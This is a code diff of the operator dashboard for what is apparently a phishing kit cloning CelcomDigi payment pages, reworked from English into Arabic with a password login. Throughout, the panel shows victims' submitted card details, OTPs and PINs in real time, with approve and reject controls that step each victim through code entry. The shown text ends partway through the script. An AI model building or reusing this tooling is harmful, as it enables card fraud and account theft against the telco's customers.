@@ -1,971 +1,1089 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Admin Panel - CelcomDigi</title>
+  <title>لوحة التحكم - CelcomDigi</title>
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: #0f172a;
-      color: #e2e8f0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: #f1f5f9;
+      color: #1e293b;
       min-height: 100vh;
     }
 
-    /* Sidebar */
-    .sidebar {
-      position: fixed;
-      left: 0; top: 0; bottom: 0;
-      width: 240px;
-      background: #1e293b;
-      border-right: 1px solid #334155;
-      padding: 0;
-      z-index: 100;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .sidebar-header {
-      padding: 20px 20px 16px;
-      border-bottom: 1px solid #334155;
-    }
-
-    .sidebar-logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 4px;
-    }
-
-    .sidebar-logo-icon {
-      width: 36px;
-      height: 36px;
-      background: linear-gradient(135deg, #003087, #1568e1);
-      border-radius: 8px;
+    /* ── LOGIN SCREEN ── */
+    #loginScreen {
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 18px;
+      min-height: 100vh;
+      background: #f1f5f9;
     }
 
-    .sidebar-logo-text {
-      font-size: 15px;
-      font-weight: 700;
-      color: #f1f5f9;
-    }
-
-    .sidebar-sub {
-      font-size: 11px;
-      color: #64748b;
-      margin-top: 2px;
-    }
-
-    .sidebar-nav {
-      padding: 12px 0;
-      flex: 1;
-    }
-
-    .nav-item {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 10px 20px;
-      font-size: 13px;
-      color: #94a3b8;
-      cursor: pointer;
-      border-left: 3px solid transparent;
-      transition: all 0.15s;
-    }
-    .nav-item:hover { background: #273549; color: #e2e8f0; }
-    .nav-item.active { background: #1a3a5c; color: #60a5fa; border-left-color: #3b82f6; }
-
-    .nav-badge {
-      margin-left: auto;
-      background: #ef4444;
-      color: #fff;
-      font-size: 11px;
-      font-weight: 700;
-      padding: 2px 7px;
-      border-radius: 10px;
-      min-width: 20px;
+    .login-card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 48px 40px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
       text-align: center;
     }
-    .nav-badge.zero { background: #334155; color: #64748b; }
 
-    .sidebar-footer {
-      padding: 16px 20px;
-      border-top: 1px solid #334155;
-      font-size: 12px;
-      color: #475569;
+    .login-logo {
+      width: 120px;
+      margin-bottom: 24px;
     }
 
-    /* Main content */
-    .main {
-      margin-left: 240px;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
+    .login-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1e293b;
+      margin-bottom: 6px;
     }
 
-    /* Top bar */
-    .topbar {
-      background: #1e293b;
-      border-bottom: 1px solid #334155;
-      padding: 14px 28px;
+    .login-sub {
+      font-size: 14px;
+      color: #64748b;
+      margin-bottom: 32px;
+    }
+
+    .login-label {
+      display: block;
+      text-align: right;
+      font-size: 13px;
+      font-weight: 600;
+      color: #374151;
+      margin-bottom: 6px;
+    }
+
+    .login-input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid #e2e8f0;
+      border-radius: 10px;
+      font-size: 15px;
+      color: #1e293b;
+      background: #f8fafc;
+      outline: none;
+      transition: border-color 0.2s;
+      margin-bottom: 20px;
+      text-align: left;
+      direction: ltr;
+    }
+
+    .login-input:focus { border-color: #3b82f6; background: #fff; }
+
+    .login-btn {
+      width: 100%;
+      padding: 13px;
+      background: #1e40af;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .login-btn:hover { background: #1d4ed8; }
+
+    .login-error {
+      display: none;
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      color: #dc2626;
+      border-radius: 8px;
+      padding: 10px 14px;
+      font-size: 13px;
+      margin-top: 12px;
+    }
+
+    /* ── MAIN DASHBOARD ── */
+    #dashboard { display: none; }
+
+    /* Header */
+    .header {
+      background: #fff;
+      border-bottom: 1px solid #e2e8f0;
+      padding: 0 24px;
+      height: 60px;
       display: flex;
       align-items: center;
       justify-content: space-between;
       position: sticky;
       top: 0;
-      z-index: 50;
+      z-index: 100;
     }
 
-    .topbar-title {
-      font-size: 18px;
-      font-weight: 700;
-      color: #f1f5f9;
-    }
-
-    .topbar-right {
+    .header-left {
       display: flex;
       align-items: center;
-      gap: 16px;
+      gap: 12px;
     }
 
-    .ws-status {
+    .header-logo {
+      height: 28px;
+    }
+
+    .header-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #1e293b;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .live-badge {
       display: flex;
       align-items: center;
       gap: 6px;
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      color: #16a34a;
+      border-radius: 20px;
+      padding: 4px 12px;
       font-size: 12px;
-      color: #64748b;
+      font-weight: 600;
     }
-    .ws-dot {
-      width: 8px;
-      height: 8px;
+
+    .live-dot {
+      width: 7px;
+      height: 7px;
+      background: #22c55e;
       border-radius: 50%;
-      background: #ef4444;
-      transition: background 0.3s;
+      animation: pulse 1.5s infinite;
     }
-    .ws-dot.connected { background: #22c55e; }
 
-    .refresh-btn {
-      background: #334155;
-      border: none;
-      color: #94a3b8;
-      padding: 6px 14px;
-      border-radius: 6px;
-      font-size: 12px;
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .logout-btn {
+      padding: 7px 16px;
+      background: #f1f5f9;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      font-size: 13px;
+      color: #64748b;
       cursor: pointer;
-      transition: all 0.15s;
-    }
-    .refresh-btn:hover { background: #475569; color: #e2e8f0; }
-
-    /* Content area */
-    .content {
-      padding: 24px 28px;
-      flex: 1;
+      font-weight: 500;
+      transition: all 0.2s;
     }
 
-    /* Stats row */
-    .stats-row {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
+    .logout-btn:hover { background: #e2e8f0; color: #1e293b; }
+
+    /* Stats bar */
+    .stats-bar {
+      display: flex;
       gap: 16px;
-      margin-bottom: 24px;
+      padding: 20px 24px;
+      flex-wrap: wrap;
     }
 
     .stat-card {
-      background: #1e293b;
-      border: 1px solid #334155;
+      background: #fff;
       border-radius: 12px;
       padding: 16px 20px;
+      flex: 1;
+      min-width: 140px;
+      border: 1px solid #e2e8f0;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
     }
 
     .stat-label {
-      font-size: 11px;
+      font-size: 12px;
       color: #64748b;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 8px;
+      font-weight: 500;
     }
 
     .stat-value {
-      font-size: 28px;
+      font-size: 26px;
       font-weight: 700;
-      color: #f1f5f9;
+      color: #1e293b;
     }
 
-    .stat-value.pending { color: #f59e0b; }
-    .stat-value.approved { color: #22c55e; }
-    .stat-value.rejected { color: #ef4444; }
+    .stat-value.green { color: #16a34a; }
+    .stat-value.red { color: #dc2626; }
+    .stat-value.blue { color: #2563eb; }
+    .stat-value.orange { color: #ea580c; }
 
-    /* Sessions table */
+    /* Main content */
+    .main-content {
+      padding: 0 24px 24px;
+    }
+
     .section-header {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      margin-bottom: 16px;
+      margin-bottom: 14px;
     }
 
     .section-title {
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 700;
-      color: #f1f5f9;
+      color: #1e293b;
     }
 
-    .filter-tabs {
-      display: flex;
-      gap: 6px;
-    }
-
-    .filter-tab {
-      padding: 5px 14px;
-      border-radius: 6px;
+    .clear-btn {
+      padding: 7px 14px;
+      background: #fff;
+      border: 1px solid #fecaca;
+      color: #dc2626;
+      border-radius: 8px;
       font-size: 12px;
       font-weight: 600;
       cursor: pointer;
-      border: 1px solid #334155;
-      color: #64748b;
-      background: transparent;
-      transition: all 0.15s;
-    }
-    .filter-tab.active {
-      background: #3b82f6;
-      border-color: #3b82f6;
-      color: #fff;
+      transition: all 0.2s;
     }
 
-    /* Session cards */
-    .sessions-list {
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-    }
+    .clear-btn:hover { background: #fef2f2; }
 
-    .session-card {
-      background: #1e293b;
-      border: 1px solid #334155;
+    /* Table */
+    .table-wrap {
+      background: #fff;
       border-radius: 14px;
+      border: 1px solid #e2e8f0;
       overflow: hidden;
-      transition: border-color 0.2s;
-    }
-    .session-card:hover { border-color: #475569; }
-    .session-card.pending { border-left: 4px solid #f59e0b; }
-    .session-card.approved { border-left: 4px solid #22c55e; }
-    .session-card.rejected { border-left: 4px solid #ef4444; }
-
-    .session-header {
-      padding: 14px 20px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid #273549;
     }
 
-    .session-id {
-      font-size: 11px;
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+
+    thead {
+      background: #f8fafc;
+      border-bottom: 1px solid #e2e8f0;
+    }
+
+    thead th {
+      padding: 12px 14px;
+      text-align: right;
+      font-weight: 600;
       color: #64748b;
-      font-family: monospace;
+      font-size: 12px;
+      white-space: nowrap;
     }
 
-    .session-time {
-      font-size: 11px;
-      color: #64748b;
+    tbody tr {
+      border-bottom: 1px solid #f1f5f9;
+      transition: background 0.15s;
     }
 
-    .status-badge {
+    tbody tr:last-child { border-bottom: none; }
+    tbody tr:hover { background: #f8fafc; }
+
+    tbody td {
+      padding: 13px 14px;
+      color: #1e293b;
+      vertical-align: middle;
+    }
+
+    .phone-cell {
+      font-weight: 700;
+      color: #1e40af;
+      font-size: 14px;
+      direction: ltr;
+      text-align: right;
+    }
+
+    .amount-cell {
+      font-weight: 700;
+      color: #16a34a;
+    }
+
+    .type-badge {
+      display: inline-block;
       padding: 3px 10px;
       border-radius: 20px;
       font-size: 11px;
-      font-weight: 700;
-      text-transform: uppercase;
-    }
-    .status-badge.pending { background: #451a03; color: #fbbf24; }
-    .status-badge.awaiting_otp { background: #1e1a45; color: #818cf8; }
-    .status-badge.awaiting_pin { background: #0f2a1e; color: #34d399; }
-    .status-badge.approved { background: #052e16; color: #4ade80; }
-    .status-badge.rejected { background: #2d0a0a; color: #f87171; }
-    .status-badge.completed { background: #052e16; color: #4ade80; }
-
-    .session-body {
-      padding: 16px 20px;
-    }
-
-    .info-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      margin-bottom: 16px;
-    }
-
-    .info-item label {
-      display: block;
-      font-size: 10px;
-      color: #64748b;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 3px;
-    }
-
-    .info-item span {
-      font-size: 13px;
-      color: #e2e8f0;
-      font-weight: 500;
-    }
-
-    /* Card details section */
-    .details-section {
-      background: #0f172a;
-      border-radius: 10px;
-      padding: 14px 16px;
-      margin-bottom: 16px;
-    }
-
-    .details-title {
-      font-size: 12px;
-      font-weight: 700;
-      color: #94a3b8;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 10px;
-    }
-
-    .details-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 10px;
-    }
-
-    .detail-item label {
-      display: block;
-      font-size: 10px;
-      color: #64748b;
-      margin-bottom: 2px;
-    }
-
-    .detail-item span {
-      font-size: 13px;
-      color: #f1f5f9;
       font-weight: 600;
-      font-family: monospace;
     }
 
-    /* OTP/PIN data */
-    .otp-data {
-      background: #1a2744;
-      border: 1px solid #2d4a8a;
-      border-radius: 8px;
-      padding: 10px 14px;
-      margin-bottom: 12px;
-      display: flex;
+    .type-bill { background: #eff6ff; color: #2563eb; }
+    .type-reload { background: #f0fdf4; color: #16a34a; }
+
+    .status-badge {
+      display: inline-flex;
       align-items: center;
-      gap: 10px;
-    }
-
-    .otp-data label {
+      gap: 5px;
+      padding: 4px 10px;
+      border-radius: 20px;
       font-size: 11px;
-      color: #93c5fd;
       font-weight: 600;
-      text-transform: uppercase;
+      white-space: nowrap;
     }
 
-    .otp-data span {
-      font-size: 20px;
-      font-weight: 700;
-      color: #60a5fa;
-      font-family: monospace;
-      letter-spacing: 4px;
-    }
+    .status-pending { background: #fefce8; color: #ca8a04; }
+    .status-approved { background: #f0fdf4; color: #16a34a; }
+    .status-rejected { background: #fef2f2; color: #dc2626; }
+    .status-awaiting_otp { background: #eff6ff; color: #2563eb; }
+    .status-otp_approved { background: #f0fdf4; color: #16a34a; }
+    .status-otp_rejected { background: #fef2f2; color: #dc2626; }
+    .status-awaiting_pin { background: #fdf4ff; color: #9333ea; }
+    .status-pin_approved { background: #f0fdf4; color: #16a34a; }
+    .status-pin_rejected { background: #fef2f2; color: #dc2626; }
+    .status-completed { background: #f0fdf4; color: #16a34a; }
 
-    .pin-data {
-      background: #1a2a1a;
-      border: 1px solid #2d5a2d;
-      border-radius: 8px;
-      padding: 10px 14px;
-      margin-bottom: 12px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .pin-data label {
+    .page-label {
       font-size: 11px;
-      color: #86efac;
-      font-weight: 600;
-      text-transform: uppercase;
-    }
-
-    .pin-data span {
-      font-size: 20px;
-      font-weight: 700;
-      color: #4ade80;
-      font-family: monospace;
-      letter-spacing: 4px;
+      color: #64748b;
+      background: #f1f5f9;
+      padding: 2px 8px;
+      border-radius: 6px;
+      display: inline-block;
     }
 
     /* Action buttons */
-    .action-row {
+    .actions-cell {
       display: flex;
-      gap: 10px;
+      gap: 6px;
       flex-wrap: wrap;
     }
 
     .btn-approve {
-      flex: 1;
-      min-width: 120px;
-      padding: 10px 20px;
+      padding: 6px 12px;
       background: #16a34a;
       color: #fff;
       border: none;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 700;
+      border-radius: 7px;
+      font-size: 12px;
+      font-weight: 600;
       cursor: pointer;
-      transition: all 0.15s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
+      transition: background 0.2s;
+      white-space: nowrap;
     }
+
     .btn-approve:hover { background: #15803d; }
-    .btn-approve:disabled { background: #334155; color: #64748b; cursor: not-allowed; }
 
     .btn-reject {
-      flex: 1;
-      min-width: 120px;
-      padding: 10px 20px;
+      padding: 6px 12px;
       background: #dc2626;
       color: #fff;
       border: none;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 700;
+      border-radius: 7px;
+      font-size: 12px;
+      font-weight: 600;
       cursor: pointer;
-      transition: all 0.15s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
+      transition: background 0.2s;
+      white-space: nowrap;
     }
+
     .btn-reject:hover { background: #b91c1c; }
-    .btn-reject:disabled { background: #334155; color: #64748b; cursor: not-allowed; }
+
+    .btn-details {
+      padding: 6px 12px;
+      background: #f1f5f9;
+      color: #475569;
+      border: 1px solid #e2e8f0;
+      border-radius: 7px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      white-space: nowrap;
+    }
+
+    .btn-details:hover { background: #e2e8f0; }
 
     .btn-delete {
-      padding: 10px 16px;
-      background: #1e293b;
-      color: #64748b;
-      border: 1px solid #334155;
-      border-radius: 8px;
+      padding: 6px 10px;
+      background: #fff;
+      color: #94a3b8;
+      border: 1px solid #e2e8f0;
+      border-radius: 7px;
       font-size: 13px;
       cursor: pointer;
-      transition: all 0.15s;
+      transition: all 0.2s;
     }
-    .btn-delete:hover { background: #334155; color: #e2e8f0; }
+
+    .btn-delete:hover { background: #fef2f2; color: #dc2626; border-color: #fecaca; }
 
     /* Empty state */
     .empty-state {
       text-align: center;
       padding: 60px 20px;
-      color: #475569;
+      color: #94a3b8;
     }
 
     .empty-icon {
-      font-size: 48px;
-      margin-bottom: 16px;
+      font-size: 40px;
+      margin-bottom: 12px;
+      opacity: 0.5;
     }
 
-    .empty-title {
+    .empty-text {
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    /* Modal */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .modal-overlay.show { display: flex; }
+
+    .modal {
+      background: #fff;
+      border-radius: 16px;
+      padding: 28px;
+      width: 100%;
+      max-width: 480px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+      direction: rtl;
+    }
+
+    .modal-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .modal-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #1e293b;
+    }
+
+    .modal-close {
+      width: 32px;
+      height: 32px;
+      background: #f1f5f9;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
       font-size: 16px;
-      font-weight: 600;
       color: #64748b;
-      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    .empty-sub {
+    .modal-close:hover { background: #e2e8f0; }
+
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid #f1f5f9;
+    }
+
+    .detail-row:last-child { border-bottom: none; }
+
+    .detail-key {
       font-size: 13px;
+      color: #64748b;
+      font-weight: 500;
     }
 
-    /* Notification toast */
+    .detail-val {
+      font-size: 13px;
+      color: #1e293b;
+      font-weight: 600;
+      direction: ltr;
+      text-align: left;
+    }
+
+    /* Toast */
     .toast {
       position: fixed;
-      top: 20px;
-      right: 20px;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
       background: #1e293b;
-      border: 1px solid #334155;
+      color: #fff;
+      padding: 12px 24px;
       border-radius: 10px;
-      padding: 14px 20px;
       font-size: 14px;
-      color: #e2e8f0;
+      font-weight: 500;
       z-index: 9999;
-      transform: translateX(120%);
       transition: transform 0.3s ease;
-      max-width: 320px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+      white-space: nowrap;
     }
-    .toast.show { transform: translateX(0); }
-    .toast.success { border-left: 4px solid #22c55e; }
-    .toast.error { border-left: 4px solid #ef4444; }
-    .toast.info { border-left: 4px solid #3b82f6; }
 
-    /* Pulse animation for new sessions */
-    @keyframes pulse-border {
-      0%, 100% { border-color: #f59e0b; }
-      50% { border-color: #fbbf24; box-shadow: 0 0 0 3px rgba(245,158,11,0.2); }
-    }
-    .session-card.new-session { animation: pulse-border 2s ease-in-out 3; }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    .toast.success { background: #16a34a; }
+    .toast.error { background: #dc2626; }
 
     /* Responsive */
-    @media (max-width: 900px) {
-      .sidebar { display: none; }
-      .main { margin-left: 0; }
-      .stats-row { grid-template-columns: repeat(2, 1fr); }
-      .info-grid { grid-template-columns: repeat(2, 1fr); }
-      .details-grid { grid-template-columns: 1fr; }
+    @media (max-width: 768px) {
+      .stats-bar { gap: 10px; padding: 14px 12px; }
+      .stat-card { min-width: 100px; padding: 12px 14px; }
+      .stat-value { font-size: 20px; }
+      .main-content { padding: 0 12px 20px; }
+      .header { padding: 0 12px; }
+      thead th, tbody td { padding: 10px 8px; }
+      .actions-cell { gap: 4px; }
+      .btn-approve, .btn-reject, .btn-details { padding: 5px 8px; font-size: 11px; }
     }
   </style>
 </head>
 <body>
 
-  <!-- Sidebar -->
-  <div class="sidebar">
-    <div class="sidebar-header">
-      <div class="sidebar-logo">
-        <div class="sidebar-logo-icon">🛡️</div>
-        <div>
-          <div class="sidebar-logo-text">Admin Panel</div>
-          <div class="sidebar-sub">CelcomDigi Clone</div>
-        </div>
-      </div>
+<!-- ══════════════════════════════════════════
+     LOGIN SCREEN
+══════════════════════════════════════════ -->
+<div id="loginScreen">
+  <div class="login-card">
+    <img class="login-logo"
+      src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/63c1e9b7b1c3a27e7e0e7b1c_celcomdigi-logo.svg"
+      onerror="this.style.display='none'"
+      alt="CelcomDigi" />
+    <div class="login-title">لوحة التحكم</div>
+    <div class="login-sub">CelcomDigi Admin Panel</div>
+
+    <label class="login-label">كلمة المرور</label>
+    <input type="password" id="passwordInput" class="login-input"
+           placeholder="أدخل كلمة المرور"
+           onkeydown="if(event.key==='Enter') doLogin()" />
+
+    <button class="login-btn" onclick="doLogin()">دخول</button>
+    <div class="login-error" id="loginError">كلمة المرور غير صحيحة. حاول مرة أخرى.</div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     DASHBOARD
+══════════════════════════════════════════ -->
+<div id="dashboard">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="header-left">
+      <img class="header-logo"
+        src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/63c1e9b7b1c3a27e7e0e7b1c_celcomdigi-logo.svg"
+        onerror="this.style.display='none'"
+        alt="CelcomDigi" />
+      <span class="header-title">لوحة التحكم</span>
     </div>
-    <div class="sidebar-nav">
-      <div class="nav-item active">
-        📋 Sessions
-        <span class="nav-badge zero" id="pendingBadge">0</span>
+    <div class="header-right">
+      <div class="live-badge">
+        <div class="live-dot"></div>
+        مباشر
       </div>
-      <div class="nav-item" onclick="clearAll()">🗑️ Clear All</div>
-    </div>
-    <div class="sidebar-footer">
-      <div id="lastUpdate">Last update: --</div>
+      <button class="logout-btn" onclick="doLogout()">خروج</button>
     </div>
   </div>
 
-  <!-- Main -->
-  <div class="main">
-    <!-- Topbar -->
-    <div class="topbar">
-      <div class="topbar-title">Payment Sessions</div>
-      <div class="topbar-right">
-        <div class="ws-status">
-          <div class="ws-dot" id="wsDot"></div>
-          <span id="wsStatusText">Connecting...</span>
-        </div>
-        <button class="refresh-btn" onclick="loadSessions()">↻ Refresh</button>
-      </div>
+  <!-- Stats -->
+  <div class="stats-bar">
+    <div class="stat-card">
+      <div class="stat-label">إجمالي الزيارات</div>
+      <div class="stat-value blue" id="statTotal">0</div>
     </div>
-
-    <!-- Content -->
-    <div class="content">
-      <!-- Stats -->
-      <div class="stats-row">
-        <div class="stat-card">
-          <div class="stat-label">Total Sessions</div>
-          <div class="stat-value" id="statTotal">0</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Pending Action</div>
-          <div class="stat-value pending" id="statPending">0</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Approved</div>
-          <div class="stat-value approved" id="statApproved">0</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Rejected</div>
-          <div class="stat-value rejected" id="statRejected">0</div>
-        </div>
-      </div>
-
-      <!-- Sessions -->
-      <div class="section-header">
-        <div class="section-title">Active Sessions</div>
-        <div class="filter-tabs">
-          <button class="filter-tab active" onclick="setFilter('all', this)">All</button>
-          <button class="filter-tab" onclick="setFilter('pending', this)">Pending</button>
-          <button class="filter-tab" onclick="setFilter('awaiting_otp', this)">OTP</button>
-          <button class="filter-tab" onclick="setFilter('awaiting_pin', this)">PIN</button>
-          <button class="filter-tab" onclick="setFilter('completed', this)">Done</button>
-        </div>
-      </div>
-
-      <div class="sessions-list" id="sessionsList">
-        <div class="empty-state">
-          <div class="empty-icon">📭</div>
-          <div class="empty-title">No sessions yet</div>
-          <div class="empty-sub">Waiting for customers to submit card details...</div>
-        </div>
-      </div>
+    <div class="stat-card">
+      <div class="stat-label">زوار نشطون الآن</div>
+      <div class="stat-value orange" id="statActive">0</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">جلسات معلقة</div>
+      <div class="stat-value" id="statPending">0</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">موافق عليها</div>
+      <div class="stat-value green" id="statApproved">0</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">مرفوضة</div>
+      <div class="stat-value red" id="statRejected">0</div>
     </div>
   </div>
 
-  <!-- Toast -->
-  <div class="toast" id="toast"></div>
+  <!-- Sessions Table -->
+  <div class="main-content">
+    <div class="section-header">
+      <div class="section-title">العملاء النشطون</div>
+      <button class="clear-btn" onclick="clearAll()">مسح الكل</button>
+    </div>
+
+    <div class="table-wrap">
+      <table id="sessionsTable">
+        <thead>
+          <tr>
+            <th>رقم الهاتف</th>
+            <th>النوع</th>
+            <th>المبلغ</th>
+            <th>التاريخ</th>
+            <th>الحالة / الصفحة</th>
+            <th>الإجراء</th>
+          </tr>
+        </thead>
+        <tbody id="sessionsBody">
+          <tr id="emptyRow">
+            <td colspan="6">
+              <div class="empty-state">
+                <div class="empty-icon">📋</div>
+                <div class="empty-text">لا توجد جلسات بعد. في انتظار العملاء...</div>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+<!-- Details Modal -->
+<div class="modal-overlay" id="detailsModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">تفاصيل البطاقة</div>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div id="modalContent"></div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
 
 <script>
-  let sessions = {};
-  let currentFilter = 'all';
-  let ws;
-  let sse;
-  let knownSessionIds = new Set();
-  let connected = false;
+// ══════════════════════════════════════════
+// AUTH
+// ══════════════════════════════════════════
+let adminToken = localStorage.getItem('adminToken') || '';
 
-  // ── SSE Connection (primary) ──
-  function connectSSE() {
-    if (sse) { try { sse.close(); } catch(e){} }
-    sse = new EventSource('/api/sse/admin');
+async function doLogin() {
+  const pw = document.getElementById('passwordInput').value.trim();
+  if (!pw) return;
 
-    sse.onopen = () => {
-      connected = true;
-      document.getElementById('wsDot').classList.add('connected');
-      document.getElementById('wsStatusText').textContent = 'Connected';
-    };
-
-    sse.onmessage = (event) => {
-      try {
-        const data = JSON.parse(event.data);
-        handleMessage(data);
-      } catch(e) {}
-    };
-
-    sse.onerror = () => {
-      connected = false;
-      document.getElementById('wsDot').classList.remove('connected');
-      document.getElementById('wsStatusText').textContent = 'Reconnecting...';
-      // SSE auto-reconnects, but also try WS as fallback
-      if (!ws || ws.readyState === WebSocket.CLOSED) {
-        connectWS();
-      }
-    };
+  try {
+    const r = await fetch('/api/admin/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ password: pw }),
+    });
+    const d = await r.json();
+    if (d.success) {
+      adminToken = d.token;
+      localStorage.setItem('adminToken', adminToken);
+      showDashboard();
+    } else {
+      document.getElementById('loginError').style.display = 'block';
+    }
+  } catch (e) {
+    document.getElementById('loginError').style.display = 'block';
   }
+}
 
-  // ── WebSocket (fallback) ──
-  function connectWS() {
+async function checkAuth() {
+  if (!adminToken) return showLogin();
+  try {
+    const r = await fetch('/api/admin/verify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ token: adminToken }),
+    });
+    const d = await r.json();
+    if (d.success) showDashboard();
+    else showLogin();
+  } catch (e) {
+    showLogin();
+  }
+}
+
+function showLogin() {
+  document.getElementById('loginScreen').style.display = 'flex';
+  document.getElementById('dashboard').style.display = 'none';
+}
+
+function showDashboard() {
+  document.getElementById('loginScreen').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'block';
+  initSSE();
+  loadSessions();
+}
+
+function doLogout() {
+  localStorage.removeItem('adminToken');
+  adminToken = '';
+  if (sse) { try { sse.close(); } catch(e){} }
+  showLogin();
+}
+
+// ══════════════════════════════════════════
+// DATA STORE
+// ══════════════════════════════════════════
+const sessionMap = {};
+let totalVisitors = 0;
+let activeCount = 0;
+
+// ══════════════════════════════════════════
+// SSE
+// ══════════════════════════════════════════
+let sse;
+
+function initSSE() {
+  if (sse) { try { sse.close(); } catch(e){} }
+  sse = new EventSource('/api/sse/admin');
+
+  sse.onmessage = (event) => {
     try {
-      const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-      const wsUrl = `${wsProtocol}//${window.location.host}/ws?role=admin`;
-      ws = new WebSocket(wsUrl);
-
-      ws.onopen = () => {
-        connected = true;
-        document.getElementById('wsDot').classList.add('connected');
-        document.getElementById('wsStatusText').textContent = 'Connected (WS)';
-        loadSessions();
-      };
-
-      ws.onmessage = (event) => {
-        try {
-          const data = JSON.parse(event.data);
-          handleMessage(data);
-        } catch(e) {}
-      };
-
-      ws.onclose = () => {
-        if (!connected) {
-          document.getElementById('wsDot').classList.remove('connected');
-          document.getElementById('wsStatusText').textContent = 'Disconnected';
-        }
-        setTimeout(() => {
-          if (!connected) connectWS();
-        }, 5000);
-      };
-
-      ws.onerror = () => {};
+      const data = JSON.parse(event.data);
+      handleSSEMessage(data);
     } catch(e) {}
-  }
+  };
 
-  function handleMessage(data) {
-    if (data.type === 'new_session') {
-      loadSessions();
-      showToast('🔔 New session: ' + data.sessionId.substring(0,12) + '...', 'info');
-    } else if (data.type === 'session_update') {
-      loadSessions();
-    } else if (data.type === 'sessions_list') {
-      updateSessions(data.sessions);
-    } else if (data.type === 'sessions_cleared') {
-      loadSessions();
-    } else if (data.type === 'session_deleted') {
-      loadSessions();
-    }
-  }
+  sse.onerror = () => {
+    setTimeout(initSSE, 3000);
+  };
+}
 
-  // ── Load sessions ──
-  async function loadSessions() {
-    try {
-      const res = await fetch('/api/admin/sessions');
-      const data = await res.json();
-      if (data.success) {
-        updateSessions(data.sessions);
+function handleSSEMessage(data) {
+  if (data.type === 'init') {
